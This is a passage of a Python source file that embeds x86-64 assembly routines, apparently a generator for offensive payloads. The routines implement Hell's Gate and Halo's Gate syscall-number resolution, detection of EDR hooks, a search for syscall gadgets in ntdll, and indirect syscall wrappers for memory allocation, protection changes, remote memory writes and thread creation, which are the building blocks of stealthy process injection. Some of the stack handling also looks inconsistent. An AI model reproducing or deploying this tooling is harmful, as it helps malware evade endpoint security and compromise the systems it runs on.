    jz .ssn_fail
    
    ; Check for common hook signatures
    movzx eax, byte [rcx]
    
    ; Check for JMP (E9)
    cmp al, 0xE9
    je .ssn_hooked
    
    ; Check for indirect JMP (FF 25)
    cmp al, 0xFF
    jne .ssn_check_stub
    cmp byte [rcx + 1], 0x25
    je .ssn_hooked
    
.ssn_check_stub:
    ; Verify syscall stub signature
    ; Expected: 4C 8B D1 B8 (mov r10, rcx; mov eax, ...)
    cmp dword [rcx], 0xB8D18B4C
    jne .ssn_alt_pattern
    
    ; Extract SSN from offset 4
    mov eax, [rcx + 4]
    and eax, 0xFFFF             ; SSN is 16-bit
    
    pop rbx
    ret
    
.ssn_alt_pattern:
    ; Some versions have different patterns
    ; Try offset 1 for the mov eax instruction
    cmp byte [rcx + 3], 0xB8
    jne .ssn_fail
    
    mov eax, [rcx + 4]
    and eax, 0xFFFF
    
    pop rbx
    ret
    
.ssn_hooked:
    ; Function is hooked - return -1 to indicate failure
    ; Caller should use Halo's Gate to find SSN from neighbors
    mov eax, -1
    pop rbx
    ret
    
.ssn_fail:
    mov eax, -1
    pop rbx
    ret''',
            'externs': set()
        }
        
        # ResolveFunction - Full function resolver with hook handling
        self.functions['ResolveFunction'] = {
            'code': '''; ==============================================================================
; ResolveFunction: Resolve syscall info with Hell's Gate + Halo's Gate
; Input:  RCX = Function name string
;         RDX = Pointer to output buffer (16 bytes minimum)
;               [+0]  DWORD: SSN
;               [+4]  DWORD: Reserved/Flags
;               [+8]  QWORD: Syscall gadget address
; Output: RAX = 1 on success, 0 on failure
;
; Implements:
;   - Hell's Gate: Direct SSN extraction from unhooked functions
;   - Halo's Gate: SSN recovery from neighboring functions when hooked
;   - Gadget hunting for indirect syscall execution
; ==============================================================================
ResolveFunction:
    push rbx
    push rsi
    push rdi
    push r12
    push r13
    push r14
    push r15
    sub rsp, 48
    
    mov r12, rcx                ; Function name
    mov r13, rdx                ; Output buffer
    
    ; Get ntdll base
    call GetNtdllBase
    test rax, rax
    jz .resolve_fail
    mov r14, rax                ; ntdll base
    mov [rsp + 40], rax         ; Save on stack too
    
    ; Find function by name
    mov rcx, r14
    mov rdx, r12
    call GetProcAddressByName
    test rax, rax
    jz .resolve_fail
    mov r15, rax                ; Function address
    
    ; Try to extract SSN (Hell's Gate)
    mov rcx, r15
    call ExtractSSN
    
    cmp eax, -1
    je .resolve_halo            ; Hooked, try Halo's Gate
    
    ; SSN extracted successfully
    mov [r13], eax              ; Store SSN
    mov dword [r13 + 4], 0      ; Clear flags
    jmp .resolve_gadget
    
.resolve_halo:
    ; ==== HALO'S GATE ====
    ; Search neighboring functions for valid syscall stubs
    ; SSN is typically sequential, so we can infer it
    
    mov rsi, r15                ; Start from hooked function
    xor edi, edi                ; Direction flag (0 = down, 1 = up)
    xor ebx, ebx                ; Distance counter
    
.halo_search:
    inc ebx
    cmp ebx, 500                ; Max search distance
    jge .resolve_fail
    
    ; Calculate neighbor address (each syscall stub is ~32 bytes)
    mov rax, rbx
    imul rax, 32                ; Stub size
    
    test edi, edi
    jnz .halo_up
    
    ; Search downward
    mov rcx, r15
    add rcx, rax
    jmp .halo_check
    
.halo_up:
    mov rcx, r15
    sub rcx, rax
    
.halo_check:
    ; Validate address is within ntdll
    mov rax, rcx
    sub rax, r14
    cmp rax, 0x200000           ; Reasonable size limit
    jae .halo_next_dir
    
    ; Try to extract SSN from neighbor
    push rcx
    call ExtractSSN
    pop rcx
    
    cmp eax, -1
    je .halo_next_dir
    
    ; Found valid SSN! Calculate target SSN
    ; If we went down by N stubs, target SSN = neighbor_SSN - N
    ; If we went up by N stubs, target SSN = neighbor_SSN + N
    test edi, edi
    jnz .halo_calc_up
    
    sub eax, ebx                ; Down: SSN - distance
    jmp .halo_found
    
.halo_calc_up:
    add eax, ebx                ; Up: SSN + distance
    
.halo_found:
    mov [r13], eax
    mov dword [r13 + 4], 1      ; Flag: recovered via Halo's Gate
    jmp .resolve_gadget
    
.halo_next_dir:
    test edi, edi
    jnz .halo_next_dist
    mov edi, 1                  ; Switch to searching upward
    jmp .halo_search
    
.halo_next_dist:
    xor edi, edi                ; Reset direction
    jmp .halo_search
    
.resolve_gadget:
    ; ==== GADGET HUNTING ====
    ; Find "syscall; ret" (0F 05 C3) gadget in ntdll for indirect syscall
    
    mov rsi, r15                ; Start from function address
    mov rcx, 0x1000             ; Max search range
    
.gadget_loop:
    test rcx, rcx
    jz .gadget_fallback
    
    ; Check for syscall (0F 05)
    cmp word [rsi], 0x050F
    jne .gadget_next
    
    ; Verify ret follows (C3)
    cmp byte [rsi + 2], 0xC3
    je .gadget_found
    
.gadget_next:
    inc rsi
    dec rcx
    jmp .gadget_loop
    
.gadget_found:
    mov [r13 + 8], rsi          ; Store gadget address
    
    mov rax, 1                  ; Success
    add rsp, 48
    pop r15
    pop r14
    pop r13
    pop r12
    pop rdi
    pop rsi
    pop rbx
    ret
    
.gadget_fallback:
    ; Use function's own syscall instruction if no clean gadget found
    mov rsi, r15
    add rsi, 0x12               ; Typical offset to syscall in stub
    mov [r13 + 8], rsi
    
    mov rax, 1
    add rsp, 48
    pop r15
    pop r14
    pop r13
    pop r12
    pop rdi
    pop rsi
    pop rbx
    ret
    
.resolve_fail:
    xor rax, rax
    add rsp, 48
    pop r15
    pop r14
    pop r13
    pop r12
    pop rdi
    pop rsi
    pop rbx
    ret''',
            'externs': set(),
            'requires': ['GetNtdllBase', 'GetProcAddressByName', 'ExtractSSN']
        }
    
    def _init_indirect_syscall(self):
        """Indirect syscall invocation helpers"""
        
        # IndirectSyscall - Execute syscall indirectly
        self.functions['IndirectSyscall'] = {
            'code': '''; ==============================================================================
; IndirectSyscall: Execute syscall through gadget (indirect syscall)
; 
; This avoids usermode hooks by:
;   1. Using our own SSN (not from hooked stub)
;   2. Executing syscall instruction from different location in ntdll
;
; Input:  RCX = SSN (System Service Number)
;         RDX = Pointer to syscall gadget (syscall; ret)
;         R8  = Arg1 for syscall
;         R9  = Arg2 for syscall
;         [rsp+0x28] = Arg3
;         [rsp+0x30] = Arg4
;         ... additional args on stack
;
; Output: RAX = NTSTATUS from syscall
;
; Note: Caller must set up stack arguments before calling
; ==============================================================================
IndirectSyscall:
    ; Save non-volatile registers
    push rbx
    push rsi
    push rdi
    push rbp
    push r12
    push r13
    push r14
    push r15
    
    ; Save gadget address
    mov r11, rdx                ; Gadget address
    
    ; Set up SSN
    mov eax, ecx                ; SSN in EAX
    mov r10, r8                 ; Arg1 -> R10 (syscall convention)
    mov rdx, r9                 ; Arg2 -> RDX
    
    ; Get remaining args from caller's stack
    ; Our stack frame is: 8 pushes * 8 = 64 bytes + return addr = 72
    ; Caller's Arg3 was at [rsp+0x28], now at [rsp+0x28+72] = [rsp+0x64]
    mov r8, [rsp + 0x68]        ; Arg3
    mov r9, [rsp + 0x70]        ; Arg4
    
    ; Jump to syscall gadget (will execute syscall and ret)
    jmp r11
    
    ; Note: ret from gadget returns to our caller
    ; We don't need cleanup here as gadget's ret handles it''',
            'externs': set()
        }
        
        # PrepareAndExecuteSyscall - High-level syscall wrapper
        self.functions['PrepareAndExecuteSyscall'] = {
            'code': '''; ==============================================================================
; PrepareAndExecuteSyscall: Resolve and execute syscall in one call
;
; Input:  RCX = Function name (e.g., "NtAllocateVirtualMemory")
;         RDX = Arg1
;         R8  = Arg2
;         R9  = Arg3
;         [rsp+0x28] = Arg4
;         ... additional args
;
; Output: RAX = NTSTATUS result
;
; This function resolves the syscall info, then executes it indirectly.
; Uses stack for temporary storage of resolved info.
; ==============================================================================
PrepareAndExecuteSyscall:
    push rbx
    push rsi
    push rdi
    push rbp
    push r12
    push r13
    push r14
    push r15
    sub rsp, 56                 ; 16-byte buffer + 40 shadow space
    
    ; Save arguments
    mov r12, rdx                ; Arg1
    mov r13, r8                 ; Arg2
    mov r14, r9                 ; Arg3
    
    ; Resolve syscall info
    ; RCX already has function name
    lea rdx, [rsp + 32]         ; Output buffer (16 bytes at rsp+32)
    call ResolveFunction
    
    test rax, rax
    jz .prep_fail
    
    ; Load resolved info
    mov ecx, [rsp + 32]         ; SSN
    mov rdx, [rsp + 40]         ; Gadget address
    
    ; Set up syscall arguments
    mov r8, r12                 ; Arg1
    mov r9, r13                 ; Arg2
    
    ; Copy Arg3 and beyond to correct stack positions
    mov rax, r14
    mov [rsp + 0x28], rax       ; Arg3
    
    ; Get additional args from original caller's stack
    ; Calculate offset: 8 pushes + 56 bytes local = 120 bytes
    mov rax, [rsp + 120 + 0x28] ; Original Arg4
    mov [rsp + 0x30], rax
    
    call IndirectSyscall
    
    add rsp, 56
    pop r15
    pop r14
    pop r13
    pop r12
    pop rbp
    pop rdi
    pop rsi
    pop rbx
    ret
    
.prep_fail:
    mov rax, 0xC0000001         ; STATUS_UNSUCCESSFUL
    add rsp, 56
    pop r15
    pop r14
    pop r13
    pop r12
    pop rbp
    pop rdi
    pop rsi
    pop rbx
    ret''',
            'externs': set(),
            'requires': ['ResolveFunction', 'IndirectSyscall']
        }
        
        # NtdllSyscallTable - Initialize syscall table
        self.functions['InitSyscallTable'] = {
            'code': '''; ==============================================================================
; InitSyscallTable: Pre-resolve common syscalls for performance
;
; Input:  RCX = Pointer to syscall table buffer (must be large enough)
;         RDX = Pointer to array of function name strings
;         R8  = Number of functions to resolve
;
; Output: RAX = Number of successfully resolved syscalls
;
; Table entry format (24 bytes each):
;   [+0]  QWORD: Function name pointer (for reference)
;   [+8]  DWORD: SSN
;   [+12] DWORD: Flags
;   [+16] QWORD: Gadget address
; ==============================================================================
InitSyscallTable:
    push rbx
    push rsi
    push rdi
    push r12
    push r13
    push r14
    push r15
    sub rsp, 40
    
    mov r12, rcx                ; Table buffer
    mov r13, rdx                ; Name array
    mov r14, r8                 ; Count
    xor r15d, r15d              ; Success counter
    xor ebx, ebx                ; Current index
    
.init_table_loop:
    cmp rbx, r14
    jge .init_table_done
    
    ; Get function name
    mov rax, [r13 + rbx * 8]
    test rax, rax
    jz .init_table_next
    
    ; Store name pointer in table
    mov rdi, r12
    imul rsi, rbx, 24           ; Entry size
    add rdi, rsi
    mov [rdi], rax              ; Store name pointer
    
    ; Resolve function
    mov rcx, rax
    lea rdx, [rdi + 8]          ; Output: SSN and gadget
    call ResolveFunction
    
    test rax, rax
    jz .init_table_next
    
    inc r15d                    ; Increment success count
    
.init_table_next:
    inc rbx
    jmp .init_table_loop
    
.init_table_done:
    mov eax, r15d
    add rsp, 40
    pop r15
    pop r14
    pop r13
    pop r12
    pop rdi
    pop rsi
    pop rbx
    ret''',
            'externs': set(),
            'requires': ['ResolveFunction']
        }
        
        # SyscallFromTable - Execute syscall from pre-resolved table
        self.functions['SyscallFromTable'] = {
            'code': '''; ==============================================================================
; SyscallFromTable: Execute syscall using pre-resolved table entry
;
; Input:  RCX = Pointer to table entry (24 bytes)
;         RDX = Arg1
;         R8  = Arg2
;         R9  = Arg3
;         Stack args for remaining
;
; Output: RAX = NTSTATUS
; ==============================================================================
SyscallFromTable:
    push rbx
    
    ; Load syscall info from table
    mov eax, [rcx + 8]          ; SSN
    mov r11, [rcx + 16]         ; Gadget address
    
    ; Check if entry is valid
    test r11, r11
    jz .table_fail
    
    ; Set up syscall
    mov r10, rdx                ; Arg1 -> R10
    mov rdx, r8                 ; Arg2 -> RDX
    mov r8, r9                  ; Arg3 -> R8
    
    ; Get Arg4 from stack
    mov r9, [rsp + 0x30]        ; Adjust for push rbx + ret addr
    
    ; Execute via gadget
    pop rbx
    jmp r11
    
.table_fail:
    mov rax, 0xC0000001
    pop rbx
    ret''',
            'externs': set()
        }
        
        # Common syscall wrappers
        self.functions['DirectNtAllocateVirtualMemory'] = {
            'code': '''; ==============================================================================
; DirectNtAllocateVirtualMemory: Allocate virtual memory via direct syscall
;
; Input:  RCX = ProcessHandle (-1 for current process)
;         RDX = BaseAddress (pointer to PVOID)
;         R8  = ZeroBits
;         R9  = RegionSize (pointer to SIZE_T)
;         [rsp+0x28] = AllocationType (MEM_COMMIT | MEM_RESERVE = 0x3000)
;         [rsp+0x30] = Protect (PAGE_EXECUTE_READWRITE = 0x40)
;
; Output: RAX = NTSTATUS
; ==============================================================================
DirectNtAllocateVirtualMemory:
    push rbx
    push rsi
    sub rsp, 56
    
    ; Save args
    mov [rsp + 32], rcx         ; ProcessHandle
    mov [rsp + 40], rdx         ; BaseAddress
    mov [rsp + 48], r8          ; ZeroBits
    mov [rsp + 56], r9          ; RegionSize
    
    ; Resolve NtAllocateVirtualMemory
    lea rcx, [rel .nt_alloc_name]
    lea rdx, [rsp + 0]          ; 16-byte buffer for resolve output
    call ResolveFunction
    
    test rax, rax
    jz .nt_alloc_fail
    
    ; Execute syscall
    mov eax, [rsp + 0]          ; SSN
    mov r11, [rsp + 8]          ; Gadget
    
    ; Restore and set args
    mov r10, [rsp + 32]         ; ProcessHandle -> R10
    mov rdx, [rsp + 40]         ; BaseAddress -> RDX
    mov r8, [rsp + 48]          ; ZeroBits -> R8
    mov r9, [rsp + 56]          ; RegionSize -> R9
    
    ; Stack args already in place from caller
    jmp r11
    
.nt_alloc_fail:
    mov rax, 0xC0000001
    add rsp, 56
    pop rsi
    pop rbx
    ret
    
.nt_alloc_name:
    db "NtAllocateVirtualMemory", 0''',
            'externs': set(),
            'requires': ['ResolveFunction']
        }
        
        self.functions['DirectNtProtectVirtualMemory'] = {
            'code': '''; ==============================================================================
; DirectNtProtectVirtualMemory: Change memory protection via direct syscall
;
; Input:  RCX = ProcessHandle
;         RDX = BaseAddress (pointer to PVOID)
;         R8  = RegionSize (pointer to SIZE_T)
;         R9  = NewProtect
;         [rsp+0x28] = OldProtect (pointer to DWORD)
;
; Output: RAX = NTSTATUS
; ==============================================================================
DirectNtProtectVirtualMemory:
    push rbx
    push rsi
    sub rsp, 56
    
    mov [rsp + 32], rcx
    mov [rsp + 40], rdx
    mov [rsp + 48], r8
    mov [rsp + 56], r9
    
    lea rcx, [rel .nt_prot_name]
    lea rdx, [rsp + 0]
    call ResolveFunction
    
    test rax, rax
    jz .nt_prot_fail
    
    mov eax, [rsp + 0]
    mov r11, [rsp + 8]
    
    mov r10, [rsp + 32]
    mov rdx, [rsp + 40]
    mov r8, [rsp + 48]
    mov r9, [rsp + 56]
    
    jmp r11
    
.nt_prot_fail:
    mov rax, 0xC0000001
    add rsp, 56
    pop rsi
    pop rbx
    ret
    
.nt_prot_name:
    db "NtProtectVirtualMemory", 0''',
            'externs': set(),
            'requires': ['ResolveFunction']
        }
        
        self.functions['DirectNtWriteVirtualMemory'] = {
            'code': '''; ==============================================================================
; DirectNtWriteVirtualMemory: Write to process memory via direct syscall
;
; Input:  RCX = ProcessHandle
;         RDX = BaseAddress
;         R8  = Buffer
;         R9  = NumberOfBytesToWrite
;         [rsp+0x28] = NumberOfBytesWritten (optional, can be NULL)
;
; Output: RAX = NTSTATUS
; ==============================================================================
DirectNtWriteVirtualMemory:
    push rbx
    push rsi
    sub rsp, 56
    
    mov [rsp + 32], rcx
    mov [rsp + 40], rdx
    mov [rsp + 48], r8
    mov [rsp + 56], r9
    
    lea rcx, [rel .nt_write_name]
    lea rdx, [rsp + 0]
    call ResolveFunction
    
    test rax, rax
    jz .nt_write_fail
    
    mov eax, [rsp + 0]
    mov r11, [rsp + 8]
    
    mov r10, [rsp + 32]
    mov rdx, [rsp + 40]
    mov r8, [rsp + 48]
    mov r9, [rsp + 56]
    
    jmp r11
    
.nt_write_fail:
    mov rax, 0xC0000001
    add rsp, 56
    pop rsi
    pop rbx
    ret
    
.nt_write_name:
    db "NtWriteVirtualMemory", 0''',
            'externs': set(),
            'requires': ['ResolveFunction']
        }
        
        self.functions['DirectNtCreateThreadEx'] = {
            'code': '''; ==============================================================================
; DirectNtCreateThreadEx: Create thread via direct syscall
;
; Input:  RCX = ThreadHandle (pointer to HANDLE)
;         RDX = DesiredAccess
;         R8  = ObjectAttributes (can be NULL)
;         R9  = ProcessHandle
;         [rsp+0x28] = StartRoutine
;         [rsp+0x30] = Argument
;         [rsp+0x38] = CreateFlags
;         [rsp+0x40] = ZeroBits
;         [rsp+0x48] = StackSize
;         [rsp+0x50] = MaximumStackSize
;         [rsp+0x58] = AttributeList
;
; Output: RAX = NTSTATUS
; ==============================================================================
DirectNtCreateThreadEx:
    push rbx
    push rsi
    sub rsp, 72
    
    mov [rsp + 32], rcx
    mov [rsp + 40], rdx
    mov [rsp + 48], r8
    mov [rsp + 56], r9
    
    lea rcx, [rel .nt_thread_name]
    lea rdx, [rsp + 0]
    call ResolveFunction
    
    test rax, rax
    jz .nt_thread_fail
    
    mov eax, [rsp + 0]
    mov r11, [rsp + 8]
    
    mov r10, [rsp + 32]
    mov rdx, [rsp + 40]
    mov r8, [rsp + 48]
    mov r9, [rsp + 56]
    
    jmp r11
    
.nt_thread_fail:
    mov rax, 0xC0000001
    add rsp, 72
    pop rsi
    pop rbx
    ret
    
.nt_thread_name:
    db "NtCreateThreadEx", 0''',
            'externs': set(),
            'requires': ['ResolveFunction']
        }
